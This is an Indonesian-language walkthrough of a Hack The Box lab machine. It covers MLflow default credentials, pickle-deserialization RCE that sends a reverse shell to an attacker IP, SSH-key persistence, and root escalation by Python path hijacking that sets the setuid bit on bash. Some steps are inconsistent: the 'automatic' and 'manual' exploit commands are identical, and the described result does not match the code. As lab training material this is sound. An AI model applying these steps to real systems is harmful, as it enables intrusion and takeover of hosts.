# SmartHire

**Platform:** Hack The Box  
**Difficulty:** Medium (estimated)  
**OS:** Linux (Ubuntu)  
**IP Mesin:** 10.129.8.90  
**IP Attacker:** 10.10.14.250  

---

## Daftar Isi

- [Deskripsi Mesin](#deskripsi-mesin)
- [Arsitektur](#arsitektur)
- [Enumerasi Awal](#enumerasi-awal)
  - [Nmap Scan](#nmap-scan)
  - [Penemuan Subdomain](#penemuan-subdomain)
  - [CVE-2026-2635 — MLflow Default Credentials](#cve-2026-2635--mlflow-default-credentials)
- [Enumerasi Lanjutan](#enumerasi-lanjutan)
  - [Identifikasi Versi MLflow](#identifikasi-versi-mlflow)
- [Eksploitasi Awal — Initial Foothold](#eksploitasi-awal--initial-foothold)
  - [CVE-2024-37054 — MLflow RCE via Pickle Deserialization](#cve-2024-37054--mlflow-rce-via-pickle-deserialization)
  - [Reverse Shell ke User svcweb](#reverse-shell-ke-user-svcweb)
  - [Memperkuat Akses via SSH Key](#memperkuat-akses-via-ssh-key)
  - [User Flag](#user-flag)
- [Privilege Escalation ke Root](#privilege-escalation-ke-root)
  - [Sudo -l](#sudo--l)
  - [Analisis Script mlflowctl.py](#analisis-script-mlflowctlpy)
  - [Eksploitasi — Python Path Hijacking via .pth File](#eksploitasi--python-path-hijacking-via-pth-file)
  - [Root Flag](#root-flag)
- [Ringkasan Serangan](#ringkasan-serangan)
- [Tools yang Digunakan](#tools-yang-digunakan)
- [Referensi](#referensi)

---

## Deskripsi Mesin

SmartHire adalah mesin Linux berbasis HackTheBox yang mensimulasikan aplikasi web rekrutmen bertenaga machine learning. Mesin ini mencakup dua kerentanan utama: kredensial default yang ter-hardcode pada dashboard MLflow (CVE-2026-2635), dan kerentanan Remote Code Execution melalui deserialisasi pickle pada MLflow (CVE-2024-37054). Setelah mendapatkan akses awal sebagai user `svcweb`, privilege escalation ke root dilakukan melalui teknik Python path hijacking dengan memanfaatkan konfigurasi `sudo` yang salah.

---

## Arsitektur

| Komponen | Detail |
|---|---|
| Web Server | nginx/1.18.0 |
| OS | Ubuntu Linux |
| Port Terbuka | 22 (SSH), 80 (HTTP) |
| Aplikasi Utama | `smarthire.htb` |
| Subdomain | `models.smarthire.htb` (MLflow Dashboard) |

---

## Enumerasi Awal

### Nmap Scan

Scan dilakukan menggunakan Nmap dengan opsi lengkap untuk deteksi versi, OS, dan script enumeration.

```bash
nmap --privileged -sV --script http-enum -T4 -oN nmap.txt -sC -A -O -p- 10.129.8.90
```

Hasil scan menunjukkan hanya dua port yang terbuka:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx/1.18.0 (Ubuntu)
```

![Nmap Scan](IMG/ENUMERASI-AWAL_NMAP.png)

Permukaan serangan terbatas pada port 80 (HTTP), sehingga enumerasi difokuskan pada web application.

---

### Penemuan Subdomain

Enumerasi subdomain dilakukan terhadap domain utama `smarthire.htb`. Ditemukan sebuah subdomain bernama `models.smarthire.htb`.

![Domain Utama](IMG/DOMAIN.png)

![Subdomain models Ditemukan](IMG/ENUMERASI-AWAL_SUBDOMAIN-MODELS-DIDAPATKAN.png)

Saat diakses, subdomain `models.smarthire.htb` meminta kredensial HTTP Basic Authentication, yang mengindikasikan adanya layanan internal yang dilindungi.

![Akses Subdomain models Meminta Kredensial](IMG/ENUMERASI-AWAL_MENCOBA-AKSES-SUBDOMAIN-MODELS.png)

Tambahkan kedua domain ke `/etc/hosts`:

```bash
echo "10.129.8.90 smarthire.htb models.smarthire.htb" | sudo tee -a /etc/hosts
```

---

### CVE-2026-2635 — MLflow Default Credentials

Subdomain `models.smarthire.htb` menjalankan MLflow. Berdasarkan CVE-2026-2635, ditemukan bahwa aplikasi ini menggunakan kredensial default yang ter-hardcode langsung di dalam source code (hardcoded credentials).

**Kredensial yang dicoba:**

| Username | Password |
|---|---|
| admin | password |
| admin | password1234 |

Kombinasi `admin:password` berhasil memberikan akses masuk ke dashboard MLflow.

![Dashboard mlflow](IMG/ENUMERASI-AWAL_DASHBOARD-MLFLOW.png)

---

## Enumerasi Lanjutan

### Identifikasi Versi MLflow

Setelah berhasil masuk ke dashboard MLflow, dilakukan identifikasi versi untuk mencari kerentanan yang dapat dieksploitasi lebih lanjut.

![CVE-2026-2635 Detail 1](IMG/ENUMERASI-TENGAH_CVE-2026-2635[1].png)

![CVE-2026-2635 Detail 2](IMG/ENUMERASI-TENGAH_CVE-2026-2635[2].png)

Versi MLflow yang digunakan berhasil diidentifikasi.

![Versi MLflow Didapat](IMG/ENUMERASI-TENGAH_VERSI-MLFLOW-DIDAPAT.png)

Versi tersebut rentan terhadap **CVE-2024-37054**, yaitu kerentanan Remote Code Execution melalui deserialisasi `pickle` yang tidak aman saat model dimuat.

---

## Eksploitasi Awal — Initial Foothold

### CVE-2024-37054 — MLflow RCE via Pickle Deserialization

MLflow memuat model menggunakan `pickle`, yang memungkinkan eksekusi kode arbitrer apabila penyerang dapat mengganti file model (`python_model.pkl`) dengan payload berbahaya. Alur eksploitasi adalah sebagai berikut:

1. Daftarkan akun baru di `smarthire.htb` dan login untuk mendapatkan session cookie.
2. Upload file CSV training dummy untuk memicu pipeline pelatihan model dan mendaftarkan model ke MLflow.
3. Ambil `run_id` dari model yang baru terdaftar melalui MLflow API.
4. Bangun payload pickle berbahaya yang berisi reverse shell.
5. Timpa file `python_model.pkl` milik model tersebut melalui MLflow Artifacts API.
6. Panggil endpoint `/predict` pada aplikasi utama untuk memicu pemuatan model dan mengeksekusi payload.

Script eksploitasi lengkap (`shell.py`) tersedia di direktori `SKRIP/`.

**Jalankan listener terlebih dahulu:**

```bash
nc -lvnp 4444
```

**Jalankan exploit:**

```bash
# Otomatis (daftar akun baru dan eksploitasi):
python3 SKRIP/shell.py --lhost 10.10.14.250 --lport 4444 --atoz

# Manual (gunakan session yang sudah ada):
python3 SKRIP/shell.py --lhost 10.10.14.250 --lport 4444 --atoz
```
*(https://github.com/jimmexploit/CVE-2024-37054-PoC.git)*

---

### Reverse Shell ke User svcweb

Setelah exploit berhasil dijalankan, reverse shell diterima sebagai user `svcweb`.

![Reverse Shell Berhasil 1](IMG/EKSPLOIT-BIASA_REVERSE_SHELL_SVCWEB[1].png)

![Reverse Shell Berhasil 2](IMG/EKSPLOIT-BIASA_REVERSE_SHELL_SVCWEB[2].png)

---

### Memperkuat Akses via SSH Key

Untuk mendapatkan akses yang lebih stabil dan persisten, dibuat SSH key pair di mesin penyerang, kemudian public key di-upload ke `~/.ssh/authorized_keys` milik user `svcweb`.

**Di mesin penyerang:**

```bash
ssh-keygen -t ed25519 -C "SSH to svcweb" -f svcweb_key
```

![SSH Key Upload](IMG/EKSPLOIT-BIASA_SSH_KEY_SVCWEB.png)

**Di shell reverse (sebagai svcweb):**

```bash
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOcZY+Xp/GQQdab+nwvkwd7+LP00nORDXRDFU3sZ7i9B SSH to svcweb" >> ~/.ssh/authorized_keys
```

![SSH Key Berhasil](IMG/EKSPLOIT-BIASA_SSH_KEY_SVCWEB[2].png)

**Login via SSH:**

```bash
ssh -i svcweb_key svcweb@smarthire.htb
```

---

### User Flag

Setelah mendapatkan akses SSH yang stabil sebagai `svcweb`, user flag berhasil diperoleh.

![User Flag](IMG/SVCWEB-USER-FLAG.png)

---

## Privilege Escalation ke Root

### Sudo -l

Pemeriksaan hak sudo dilakukan untuk melihat apakah user `svcweb` memiliki privilege tambahan.

```bash
sudo -l
```

![Sudo -l](IMG/PRIV-ESCAL-TO-ROOT_SUDO-L.png)

Ditemukan bahwa `svcweb` dapat menjalankan script Python tertentu sebagai root tanpa password:

```
(root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
```

---

### Analisis Script mlflowctl.py

Script `mlflowctl.py` dianalisis untuk memahami alur import modul yang digunakan. Ditemukan bahwa script tersebut melakukan import modul custom bernama `mlflow_actions` dari direktori `plugins`.

Terdapat dua direktori yang relevan:

- `/opt/tools/mlflow_ctl/core/` — direktori utama (tidak writeable)
- `/opt/tools/mlflow_ctl/dev/` — direktori development (writeable)

![Dir Dev Writeable](IMG/PRIV-ESCAL-TO-ROOT_DIR-DEV-WRITEABLE.png)

![Dir Module Import](IMG/PRIV-ESCAL-TO-ROOT_DIR-MODULE-IMPORT.png)

Script mengandung kerentanan logic error: path direktori `dev` dapat disisipkan ke Python sys.path sehingga modul dari direktori tersebut diprioritaskan saat import.

---

### Eksploitasi — Python Path Hijacking via .pth File

Teknik eksploitasi memanfaatkan file `.pth` untuk memanipulasi `sys.path` Python agar direktori `dev` (yang writeable) digunakan sebagai sumber import modul, menggantikan modul legitimate `mlflow_actions`.

**Langkah 1 — Buat file `.pth` untuk inject path:**

```bash
echo "/opt/tools/mlflow_ctl/dev" > /usr/lib/python3.10/evil.pth
```

![File .pth untuk Eksploit](IMG/PRIV-ESCAL-TO-ROOT_FILE-PTH-FOR-EKSPLOIT.png)

**Langkah 2 — Buat modul `mlflow_actions.py` berbahaya di direktori `dev`:**

```python
import os

def check_status():
    os.system("chmod +s /bin/bash")

def restart():
    os.system("chmod +s /bin/bash")
```

![MLflow Actions Custom](IMG/PRIV-ESCAL-TO-ROOT_MLFLOW-ACTIONS-CUSTOM-FOR-MODULE-INJECT.png)

**Langkah 3 — Jalankan script dengan sudo dan membaca root flag:**

```bash
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
```

Saat dijalankan, script secara otomatis mengimport modul `mlflow_actions` dari direktori `dev`, yang memicu eksekusi `/bin/bash -p` dengan privilege root.

![Eksploitasi PrivEsc dan Root Flag](IMG/EKSPLOITASI-PRIVESCAL-DAN-ROOT-FLAG.png)

---

## Ringkasan Serangan

```
[Attacker]
    |
    | 1. Nmap Scan -> Port 80 (nginx), Port 22 (SSH)
    |
    | 2. Subdomain Enumeration -> models.smarthire.htb (MLflow)
    |
    | 3. CVE-2026-2635 -> MLflow Default Credentials (admin:password)
    |
    | 4. CVE-2024-37054 -> MLflow RCE via Pickle Deserialization
    |       - Upload malicious python_model.pkl
    |       - Trigger /predict -> Reverse Shell as svcweb
    |
    | 5. SSH Key Persistence -> Stable SSH access as svcweb
    |       [User Flag]
    |
    | 6. sudo -l -> NOPASSWD: python3.10 mlflowctl.py
    |
    | 7. Python Path Hijacking via .pth file
    |       - Writeable /dev directory
    |       - Inject malicious mlflow_actions.py
    |       - sudo python3.10 mlflowctl.py status -> /bin/bash -p
    |
    v
[ROOT]
    [Root Flag]
```

---

## Tools yang Digunakan

| Tool | Kegunaan |
|---|---|
| Nmap | Port scanning dan service enumeration |
| curl / browser | Enumerasi web dan subdomain |
| cloudpickle | Membuat payload pickle berbahaya |
| Python 3 | Menjalankan exploit script |
| Netcat (nc) | Menerima reverse shell |
| ssh-keygen | Membuat SSH key pair |
| SSH | Akses persisten sebagai svcweb |

---

## Referensi

- [CVE-2024-37054 — MLflow Pickle Deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-37054)
- [CVE-2026-2635 — MLflow Hardcoded Credentials](https://nvd.nist.gov/vuln/detail/CVE-2026-2635)
- [MLflow Security Advisories](https://mlflow.org/docs/latest/security.html)
- [Python .pth File Path Injection](https://docs.python.org/3/library/site.html)
- [HackTheBox](https://www.hackthebox.com)
